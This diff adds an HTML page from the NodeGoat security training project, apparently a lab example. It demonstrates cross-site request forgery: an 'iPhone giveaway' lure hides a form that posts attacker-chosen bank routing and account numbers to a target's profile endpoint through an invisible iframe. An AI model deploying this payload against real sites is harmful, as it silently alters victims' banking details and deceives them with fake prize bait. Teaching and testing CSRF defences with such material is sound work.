@@ -1,0 +1,36 @@
+<!doctype html>
+<html lang="en" ng-app>
+
+<head>
+  <title>NodeGoat CSRF Example</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="/css/bootstrap.min.css">
+  <link rel="stylesheet" href="/css/bootstrap-responsive.min.css">
+  <style>
+    body {
+      padding-top: 60px;
+    }
+  </style>
+
+</head>
+
+<body style="background-color:#EEE">
+  <div class="container">
+
+    <div class="page-header">
+      <div align="center">
+      <div style="background:url(/img/iphones.jpeg) no-repeat center; height:150px; width:300px;"></div>
+        <h1>You are about to win a brand new iPhone!</h1>
+        <h2> Click on the win button to claim it...</h2>
+        <form method="POST" action="{{target}}/profile" target="iframeHidden">
+          <input type="hidden" name="bankRouting" value="88888888#" />
+          <input type="hidden" name="bankAcc" value="9999999999" />
+          <input type="submit" style="text-align: center" class="span4 btn btn-primary" value="WIN !!!" />
+        </form>
+      </div>
+    </div>
+  </div>
+<iframe name="iframeHidden" width="1" height="1"/>
+</body>
+
+</html>
